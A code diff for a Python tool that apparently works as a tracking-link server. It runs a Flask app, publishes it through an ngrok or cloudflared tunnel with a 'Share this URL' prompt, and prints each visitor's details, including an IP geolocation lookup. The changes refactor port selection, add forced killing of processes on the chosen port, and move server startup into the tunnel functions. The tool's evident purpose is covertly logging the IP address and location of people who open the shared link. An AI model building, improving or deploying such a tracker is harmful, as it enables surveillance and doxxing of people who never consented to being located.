@@ -11,6 +11,7 @@ import shutil
 import platform
 import signal
 import re
+import socket
 
 def ensure_pip():
     try:
@@ -95,6 +96,33 @@ app = Flask(__name__)
 ngrok_tunnel = None
 cloudflared_process = None
 
+def get_free_port():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(('', 0))
+    addr, port = s.getsockname()
+    s.close()
+    return port
+
+def kill_process_on_port(port):
+    try:
+        if platform.system() == "Windows":
+            output = subprocess.check_output(f'netstat -ano | findstr :{port}', shell=True).decode()
+            pids = set()
+            for line in output.strip().split('\n'):
+                parts = line.strip().split()
+                if len(parts) >= 5 and parts[1].endswith(f":{port}"):
+                    pids.add(parts[-1])
+            for pid in pids:
+                subprocess.call(f"taskkill /PID {pid} /F", shell=True)
+        else:
+            output = subprocess.check_output(f"lsof -ti:{port}", shell=True).decode().strip()
+            pids = output.split('\n')
+            for pid in pids:
+                if pid.isdigit():
+                    subprocess.call(f"kill -9 {pid}", shell=True)
+    except Exception:
+        pass
+
 def get_ip_geolocation(ip):
     try:
         url = f"https://ipinfo.io/{ip}/json"
@@ -154,9 +182,6 @@ def index():
     """
     return html
 
-def run_flask_server():
-    app.run(host="0.0.0.0", port=5000)
-
 def get_or_ask_auth_token():
     token_file = "ngrok_token.txt"
     if os.path.exists(token_file):
@@ -171,57 +196,36 @@ def get_or_ask_auth_token():
         f.write(token)
     return token
 
-def kill_process_on_port(port=5000):
-    try:
-        if platform.system() == "Windows":
-            cmd_find = f'netstat -ano | findstr :{port}'
-            output = subprocess.check_output(cmd_find, shell=True).decode()
-            for line in output.strip().split('\n'):
-                parts = line.strip().split()
-                if len(parts) >= 5 and parts[1].endswith(f":{port}"):
-                    pid = parts[-1]
-                    subprocess.call(f"taskkill /PID {pid} /F", shell=True)
-        else:
-            cmd_find = f"lsof -ti:{port}"
-            pids_bytes = subprocess.check_output(cmd_find, shell=True)
-            pids = pids_bytes.decode().strip().split('\n') if pids_bytes else []
-            for pid in pids:
-                if pid.isdigit():
-                    subprocess.call(f"kill -9 {pid}", shell=True)
-    except Exception:
-        pass
-
 def start_ngrok_tunnel():
+    global ngrok_tunnel
     ngrok.kill()
     auth_token = get_or_ask_auth_token()
     try:
         ngrok.set_auth_token(auth_token)
-    except Exception:
+    except Exception as e:
+        print(f"[!] Error setting ngrok auth token: {e}")
         return None
-    time.sleep(2)
+    port = get_free_port()
+    kill_process_on_port(port)
+    flask_thread = threading.Thread(target=lambda: app.run(host="0.0.0.0", port=port), daemon=True)
+    flask_thread.start()
+    time.sleep(3)
     try:
-        tunnel = ngrok.connect(5000)
-        for _ in range(10):
-            if tunnel.public_url:
-                return tunnel
-            time.sleep(0.5)
-        return tunnel
-    except Exception:
+        ngrok_tunnel = ngrok.connect(port)
+        return ngrok_tunnel
+    except Exception as e:
+        print(f"[!] Failed to start ngrok tunnel: {e}")
         return None
 
 def option_2_public_tracker():
-    kill_process_on_port(5000)
     global ngrok_tunnel
-    flask_thread = threading.Thread(target=run_flask_server, daemon=True)
-    flask_thread.start()
-    print("[*] Starting ngrok tunnel...")
-    ngrok_tunnel = start_ngrok_tunnel()
-    if not ngrok_tunnel:
+    tunnel = start_ngrok_tunnel()
+    if not tunnel:
         print("[!] Failed to start ngrok tunnel.")
         return
-    print(f"\n[+] Share this URL:\n\n    {ngrok_tunnel.public_url}\n")
-    while True:
-        try:
+    print(f"\n[+] Share this URL:\n\n    {tunnel.public_url}\n")
+    try:
+        while True:
             visitor = visitor_queue.get()
             for k, v in visitor.items():
                 print(f"{k.capitalize()}: {v}")
@@ -233,19 +237,22 @@ def option_2_public_tracker():
                 if choice == "y":
                     webbrowser.open(url)
             print()
-        except KeyboardInterrupt:
-            if ngrok_tunnel:
-                ngrok.disconnect(ngrok_tunnel.public_url)
-                ngrok.kill()
-            break
-        except:
-            pass
+    except KeyboardInterrupt:
+        if ngrok_tunnel:
+            ngrok.disconnect(ngrok_tunnel.public_url)
+            ngrok.kill()
 
 def start_cloudflared_tunnel():
     global cloudflared_process
+    port = get_free_port()
+    kill_process_on_port(port)
+    flask_thread = threading.Thread(target=lambda: app.run(host="0.0.0.0", port=port), daemon=True)
+    flask_thread.start()
+    time.sleep(3)
+    install_cloudflared()
     try:
         cloudflared_process = subprocess.Popen(
-            ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
+            ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
             stdout=subprocess.PIPE,
             stderr=subprocess.STDOUT,
             text=True,
@@ -253,34 +260,39 @@ def start_cloudflared_tunnel():
             universal_newlines=True,
         )
     except FileNotFoundError:
+        print("[!] cloudflared executable not found.")
         return None
+
     public_url = None
     pattern = re.compile(r"https?://[^\s]+trycloudflare.com")
+    # Read output lines and look for the tunnel URL
     for line in iter(cloudflared_process.stdout.readline, ""):
         line = line.strip()
+        # Uncomment the next line to debug cloudflared output:
+        # print(f"cloudflared: {line}")
         match = pattern.search(line)
         if match:
             public_url = match.group(0)
             break
+
     if not public_url:
         try:
             cloudflared_process.terminate()
-        except:
+        except Exception:
             pass
+        print("[!] Failed to get public URL from cloudflared.")
         return None
     return public_url
 
 def option_3_cloudflare_tracker():
-    kill_process_on_port(5000)
-    flask_thread = threading.Thread(target=run_flask_server, daemon=True)
-    flask_thread.start()
-    install_cloudflared()
-    public_url = start_cloudflared_tunnel()
-    if not public_url:
-        print("[!] cloudflared tunnel failed.")
-        return
-    print(f"\n[+] Share this URL:\n\n    {public_url}\n")
+    global cloudflared_process
     try:
+        # Flask app and tunnel start moved inside start_cloudflared_tunnel()
+        public_url = start_cloudflared_tunnel()
+        if not public_url:
+            print("[!] cloudflared tunnel failed.")
+            return
+        print(f"\n[+] Share this URL:\n\n    {public_url}\n")
         while True:
             visitor = visitor_queue.get()
             for k, v in visitor.items():
@@ -315,13 +327,13 @@ def main_menu():
         elif choice == "4":
             try:
                 ngrok.kill()
-            except:
+            except Exception:
                 pass
             try:
                 if cloudflared_process:
                     cloudflared_process.terminate()
                     cloudflared_process.wait()
-            except:
+            except Exception:
                 pass
             sys.exit(0)
 
@@ -331,11 +343,11 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         try:
             ngrok.kill()
-        except:
+        except Exception:
             pass
         try:
             if cloudflared_process:
                 cloudflared_process.terminate()
                 cloudflared_process.wait()
-        except:
+        except Exception:
             pass
